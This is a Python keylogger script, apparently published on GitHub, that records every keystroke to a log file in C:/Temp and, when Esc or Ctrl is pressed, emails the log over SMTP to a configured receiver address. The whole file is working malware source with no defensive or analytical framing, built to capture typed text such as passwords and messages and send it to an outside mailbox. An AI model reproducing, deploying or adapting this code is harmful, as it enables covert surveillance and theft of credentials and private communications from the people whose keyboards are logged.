# Program Developed by AJIMATI IBRAHIM A.K.A Horlalaycon @ github https://github.com/Horlalaycon

from pynput.keyboard import Listener
import smtplib
from email.message import EmailMessage
import os

# file name e.g log.txt
filename = "log.txt"

# directory path e.g C:/Temp
dpath = "C:/Temp/"

filepath = dpath + filename


def log_key(key):
    letter = str(key)
    letter = letter.replace("'", "")

    file_path = dpath + filename

    # mail Credentials
    smtp_relay = 'smtp relay'

    smtp_relay_port = 587 # smtp port

    smtp_server_username = "smtp server username"

    smtp_server_password = "smtp server password"

    from_addr = "sender email addr"

    receiver_addr = "receiver email addr"

# handle special keys like backspace
    if letter == "Key.enter":
        letter = "\n"

    elif letter == "Key.tab":
        letter = "\t"

    elif letter == "Key.space":
        letter = " "
    elif letter == "Key.shift":
        letter = ""

    elif letter == "Key.backspace":
        letter = ""
        with open(file_path, 'r') as remove:
            lines = remove.read()
            remove.close()
            with open(file_path, 'w') as save:
                save.write(lines[:-1])
                save.close()

    # Send to mailbox
    elif letter == "Key.esc" or letter == "Key.ctrl":
        letter = ""
        with open(file_path, 'r') as log:

            body = log.read()

            server = smtplib.SMTP(host=smtp_relay, port=smtp_relay_port)
            server.starttls()
            server.login(user=smtp_server_username, password=smtp_server_password)

            msg = EmailMessage()
            msg.set_content(body)
            msg['From'] = from_addr
            msg['Subject'] = 'LOG FILES'
            msg['To'] = receiver_addr
            server.send_message(msg)
            server.quit()

    # save keystrokes to files
    with open(file_path, "a") as f:
        f.write(letter)


# check if file is present
files = os.listdir(dpath)
for file in files:
    if file == filename:
        os.remove(filepath)

# start listening to keystrokes
with Listener(on_press=log_key)as listen:
    listen.join()
